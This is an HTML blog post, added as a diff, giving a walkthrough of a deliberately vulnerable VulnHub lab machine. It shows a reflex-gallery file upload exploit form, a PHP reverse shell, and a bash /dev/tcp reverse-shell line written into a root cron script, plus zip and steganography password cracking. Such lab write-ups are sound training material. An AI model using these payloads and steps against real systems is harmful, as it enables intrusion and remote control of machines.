@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <!-- PAGE SEO -->
+        <title>TBBT: Fun with Flags Walkthrough</title>
+        <meta name="author" content="m8r0wn">
+        <meta name="description" content="Emaragko's TBBT: FunWithFlags full walkthrough. Including all 7 flags and exploit techniques.">
+        <meta name="keywords" content="htb,vulnhub,oscp,exploit,bugbounty,infosec,cybersecurity,redteam,pentest">
+
+        <!-- Meta tags & Resources -->
+        <meta name="robots" content="index, follow">
+        <meta name="viewport" content="initial-scale=1.0">
+        <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+        <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+        <link rel="stylesheet" href="/css/core.css">
+        <script type="text/javascript" src="/config.js"></script>
+
+        <!-- External JS Resources -->
+        <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+        <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/js/all.min.js" crossorigin="anonymous"></script>
+
+        <!--Google Analytics-->
+        <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+        ga('create', Config.gtag, 'auto');
+        ga('set', 'anonymizeIp', true);
+        ga('send', 'pageview');
+        </script>
+
+        <!-- Code highlighter -->
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/styles/default.min.css" disabled="">
+        <link class="codestyle" rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/styles/railscasts.min.css">
+        <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script>
+    </head>
+    <body>
+        <navbar></navbar>
+        <banner id="banner"></banner>
+        <div id="wrapper" class="center">
+            <div class="content">
+                <h1>TBBT: FunWithFlags Walkthrough</h1>
+                <span class="post_date">March 18, 2020</span>
+                <hr>
+
+As a fan of The Big Bang Theory, and while practicing "social distance" due to COVID-19, I decided to try a writeup for <a href="https://www.vulnhub.com/entry/tbbt-funwithflags,437/">emaragko's TBBT: FunWithFlags</a> machine on <a href="https://www.vulnhub.com">vulnhub.com</a>. My goal was to gain root privileges on the box and identify all 7 flags using only open source tools, without the use of Metasploit.
+               <h3>Port Scanning</h3>
+               When first launching the virtual machine (VM) with VirtualBox, the DHCP address was provided on screen prior to login. Anyone who has used vulnhub before knows, this is super helpful as the first step is always finding where the system landed on the network. Using the remote address, I started on my Kali machine and launched an Nmap scan, with the service detection argument, to see what services were available for further investigation.
+
+               <pre><code class="bash">nmap -Pn -sV 192.168.1.105 -p 0-65535 -v
+
+Nmap scan report for 192.168.1.105
+Host is up (0.010s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+1337/tcp open  waste?</code></pre>
+
+               <h3>Anonymous FTP</h3>
+               Reviewing the port scan results, I checked the FTP server on port 21 for anonymous access using the username "anonymous" and was not prompted for a password. This allowed me to search the directories of each user and download files for review:
+
+               <pre><code class="bash">ftp 192.168.1.105
+Connected to 192.168.1.105.
+220 (vsFTPd 3.0.3)
+Name (192.168.1.105:root): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls pub
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Mar 03 23:57 amy
+drwxr-xr-x    2 ftp      ftp          4096 Mar 04 00:40 bernadette
+drwxr-xr-x    2 ftp      ftp          4096 Mar 17 19:38 howard
+drwxr-xr-x    2 ftp      ftp          4096 Mar 03 23:57 leonard
+drwxr-xr-x    2 ftp      ftp          4096 Mar 05 00:25 penny
+drwxr-xr-x    2 ftp      ftp          4096 Mar 03 23:57 raj
+-rw-r--r--    1 ftp      ftp        297410 Mar 04 00:09 roomate_agreement.jpg
+-rw-r--r--    1 ftp      ftp          3348 Mar 04 00:08 roomate_agreement.txt
+drwxr-xr-x    2 ftp      ftp          4096 Mar 04 19:38 sheldon
+226 Directory send OK.
+ftp></code></pre>
+               While digging through each named directory, I found the file "/pub/bernadette/PENNY_README_ASAP.txt". This provided Penny's username and indicate credential reuse on the account. Therefore, I went to the "/pub/penny/" directory, where I found another file called "wifi_password.txt". I had a good laugh reviewing some of the other content on the server but, with a potential set of credentials, it was time to check out the web application hosted on port 80.
+               <pre><code class="bash">root@T460: cat PENNY_README_ASAP.txt
+Penny the IT department from my Pharmaceutical company opened you an account in the B2B website.
+You need to go there ASAP and learn our drugs for your interview tomorrow.
+I dont remember the link, but it is easy you will find it!
+Username: penny69
+Password: cant post it here as sheldon said. you know the password. you use it everywhere.</code></pre>
+
+               <h3>Directory Brute Force</h3>
+               <img src="/posts/2020/01/web_server.png" class="post_pic center">
+               The web server's root page provided little information and contained no links for further browsing, although the robots.txt file contained some interesting invalid entries. To help identify a potential attack surface, I performed directory brute-forcing with dirb using the default wordlist (/usr/share/dirb/wordlists/common.txt). This revealed a phpmyadmin portal, a private "Prescription Drug B2B" page where I was able to leverage the previously collected "penny69" credentials, and a WordPress site hosted at "/music/wordpress".
+               <pre><code class="bash">root@T460: dirb http://192.168.1.105
+...
+---- Scanning URL: http://192.168.1.105/ ----
++ http://192.168.1.105/index.html (CODE:200|SIZE:239)
+==> DIRECTORY: http://192.168.1.105/javascript/
+==> DIRECTORY: http://192.168.1.105/music/
+==> DIRECTORY: http://192.168.1.105/phpmyadmin/
+==> DIRECTORY: http://192.168.1.105/private/
++ http://192.168.1.105/robots.txt (CODE:200|SIZE:112)
++ http://192.168.1.105/server-status (CODE:403|SIZE:301)
+...</code></pre>
+               <h3>WordPress Scanning</h3>
+               After attempting default credentials on the server's login pages without success, I used WPScan to assess the WordPress site. This revealed an out-of-date plugin, reflex-gallery, using an insecure version 3.1.3:
+               <pre><code class="bash">root@T460: wpscan --url http://192.168.1.105/music/wordpress -e ap
+...
+[+] reflex-gallery
+ | Location: http://192.168.1.105/music/wordpress/wp-content/plugins/reflex-gallery/
+ | Last Updated: 2019-05-10T16:05:00.000Z
+ | [!] The version is out of date, the latest version is 3.1.7
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 3.1.3 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://192.168.1.105/music/wordpress/wp-content/plugins/reflex-gallery/readme.txt
+...</code></pre>
+               <h3>PHP Shell</h3>
+               The reflex-gallery plugin version 3.1.3 has a publicly available exploit that allowed for arbitrary file upload on the server. This exploit code is freely available on <a href="https://www.exploit-db.com/exploits/36374">exploit-db</a> (36374), yet required some minor modifications to fit our situation. While reading through the code, I manually investigated each URL referenced and found the first flag at: <a href="">http://192.168.1.105:1337/wordpress/wp-content/uploads/2015/03/</a>.
+               <pre><code class="bash">FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}</code></pre>
+
+
+               <pre><code class="html">&lt;form method="POST" action="http://192.168.1.105/music/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2020&Month=03" enctype="multipart/form-data"&gt;
+&lt;input type="file" name="qqfile"&gt;&lt;br&gt;
+&lt;input type="submit" name="Submit" value="Pwn!"&gt;
+&lt;/form&gt;</code></pre>
+               The exploit code created a stand alone HTML form that sent a POST request to the vulnerable server, ultimately uploading our payload file. This occurred because the application failed to properly sanitize the user supplied input. As a result, I was able to upload a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">PHP reverse shell</a> and forced server execution by browsing to <a href="">http://192.168.1.105/music/wordpress/wp-content/uploads/2020/03/php-reverse-shell.php</a>. The reverse shell was used to gain an initial foothold on the system as the "www-data" user.
+               <img src="/posts/2020/01/initial_shell.png" class="post_pic center">
+
+               <h3>Privilege Escalation</h3>
+               Once on the system, I used the following command to elevate the limited shell to "/bin/bash" and continued searching the file system:
+               <pre><code class="bash">python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
+
+               The home directory look very similar to the FTP server, with a user folder configured for each person on the show. After further investigation, the "/home/leonard" directory contained a file called "thermostat_set_temp.sh" with read-write-execute permissions by any user on the system. Furthermore, this file was executed by the root user every minute through an automated cron job. To exploit this configuration, a bash reverse shell was echo'ed into the file and a new listener was setup on my Kali system to capture the incoming shell.
+
+               <pre><code class="bash">www-data@tbbt:/home$ ls
+amy  bernadette  funwithflags  howard  leonard	penny  raj  sheldon
+
+www-data@tbbt:/home$ ls leonard -al
+total 24
+drwxr-xr-x  2 leonard leonard 4096 Mar  6 00:47 .
+drwxr-xr-x 10 root    root    4096 Mar  4 02:33 ..
+-rw-------  1 leonard leonard    0 Mar  6 00:47 .bash_history
+-rw-r--r--  1 leonard leonard  220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 leonard leonard 3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 leonard leonard  655 May 16  2017 .profile
+-rwxrwxrwx  1 root    root      43 Mar 17 17:58 thermostat_set_temp.sh
+
+www-data@tbbt:/home$ cat /etc/crontab
+...
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/1 *	* * *	root	/home/leonard/thermostat_set_temp.py
+...
+
+www-data@tbbt:/home$ echo "bash -i >& /dev/tcp/192.168.1.19/8081 0>&1" > /home/leonard/thermostat_set_temp.sh</code></pre>
+               Once the cron job was triggered and root shell initiated, I was able to read the following flag at "/root/FLAG-leonard.txt":
+               <pre><code class="bash">root@tbbt: cat /root/FLAG-leonard.txt
+                         ____
+                        /    \
+                       /______\
+                          ||
+           /~~~~~~~~\     ||    /~~~~~~~~~~~~~~~~\
+          /~ () ()  ~\    ||   /~ ()  ()  () ()  ~\
+         (_)========(_)   ||  (_)==== ===========(_)
+          I|_________|I  _||_  |___________________|
+.////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Gongrats!
+You have rooted the box! Now you can sit on Sheldons spot!
+FLAG-leonard{17fc95224b65286941c54747704acd3e}
+
+I hope you liked it!</code></pre>
+               <h3>Amy Flag</h3>
+               Inside the "/home/amy" directory, a Linux binary called "secretdiary" was found. After performing the strings command on the file, the password and flag values were revealed. I went back and execute the file, inputting the proper information, for additional verification:
+
+               <pre><code class="bash">www-data@tbbt:/home/amy$ ./secretdiary
+Enter your username:
+amy
+Enter your password:
+-------
+
+Login Success!
+
+Soon I will be adding my secrets here..
+FLAG-amy{60263777358690b90e8dbe8fea6943c9}</code></pre>
+
+               <h3>Penny Flag</h3>
+               A hidden file was discovered at "/home/penny/.FLAG.penny.txt" that exposed a base64 encoded string. The following command was used to decode the string and recover the flag:
+               <pre><code class="bash">www-data@tbbt:/home/penny$ cat .FLAG.penny.txt|base64 -d && echo -e "\n"
+cat .FLAG.penny.txt|base64 -d && echo -e "\n"
+FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}</code></pre>
+
+               <h3>Bernadette Flag</h3>
+               While executing commands as the "www-data" user, looking for privilege escalation opportunities, I dug through the web application configuration files. This revealed database credentials to the "bigpharamcorp" user in "/var/www/html/private/db_config.php":
+               <pre><code class="bash">www-data@tbbt:/var/www/html/private$ cat db_config.php
+&lt;?php
+// Create connection
+$DBUSER = 'bigpharmacorp';
+$DBPASS = '-------';
+
+$con=mysqli_connect("127.0.0.1",$DBUSER,$DBPASS,"bigpharmacorp");
+...</code></pre>
+
+               This was used to access "http://192.168.1.105/phpmyadmin/" and search the bigpharmacorp > users table. The Bernadette flag was found in the "bernadette" user's description field, as shown below. I used Hashcat to recover additional user accounts on this site. However, no additional flags were found or access provided.
+               <img src="/posts/2020/01/bernadette_flag.png" class="post_pic center">
+
+
+               <h3>Raj Flag</h3>
+               Following the same path used to identify the Bernadette flag, I enumerated the WordPress configuration file at "/var/www/html/music/wordpress/" to reveal another set of database credentials:
+
+               <pre><code class="bash">www-data@tbbt:/var/www/html/music/wordpress$ cat wp-config.php
+...
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'footprintsonthemoon' );
+
+/** MySQL database username */
+define( 'DB_USER', 'footprintsonthemoon' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '---------' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+...</code></pre>
+
+               Logging into the phpmyadmin site, these credentials provided access to the footprintsonthemoon database where a private WordPress post was found with the Raj flag. Note, I am assuming the name listed on the flag is a typo.
+               <img src="/posts/2020/01/raj_flag.png" class="post_pic center">
+
+
+               <h3>Howard Flag</h3>
+               This was the hardest of the 7 flags to find and definitely required some persistence! During my initial look at the anonymous FTP server, a password-protected zip file was found at "/pub/howard/super_secret_nasa_stuff_here.zip". Unable to guess the password, I set it aside hoping to find the password elsewhere on the system. <br>
+               I root'ed the box and found the other 6 flags, but was out of luck on this one. I turned to fcrackzip to try and brute-force the password, using the rockyou.txt password list, and was able to successfully recover the "marsroversketch.jpg" file after only a few minutes.
+               <pre><code class="bash">root@T460: fcrackzip -u -D -p rockyou.txt super_secret_nasa_stuff_here.zip
+PASSWORD FOUND!!!!: pw == ------  </code></pre>
+
+               To my surprise, the picture provided no indication of a flag. However, it felt like there was still more to find. I spent some time researching steganography and came across the tool <a href="https://github.com/Paradoxis/StegCracker">stegcracker</a>, which is a Python based utility that can brute-force a picture file to uncover hidden data. I tried this against the unzipped image, again using the rockyou.txt list, to recover the last and final flag!
+               <pre><code class="bash">root@T460: stegcracker marsroversketch.jpg rockyou.txt
+StegCracker 2.0.7 - (https://github.com/Paradoxis/StegCracker)
+Copyright (c) 2020 - Luke Paris (Paradoxis)
+
+Counting lines in wordlist..
+Attacking file 'marsroversketch.jpg' with wordlist 'rockyou.txt'..
+Successfully cracked file with password: --------
+Tried 51285 passwords
+Your file has been written to: marsroversketch.jpg.out
+
+root@T460: cat marsroversketch.jpg.out
+FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}</code></pre>
+
+               <h4>References and Additional Resources:</h4>
+               <a href="https://www.vulnhub.com/entry/tbbt-funwithflags,437/">https://www.vulnhub.com/entry/tbbt-funwithflags,437/</a><br>
+               <a href="https://www.exploit-db.com/exploits/36374">https://www.exploit-db.com/exploits/36374</a><br>
+               <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a><br>
+               <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br>
+               <a href="https://github.com/Paradoxis/StegCracker">https://github.com/Paradoxis/StegCracker</a>
+                </div>
+        </div>
+        <footer></footer>
+       <script type="text/javascript" src="/js/core.js"></script>
+    </body>
+</html>
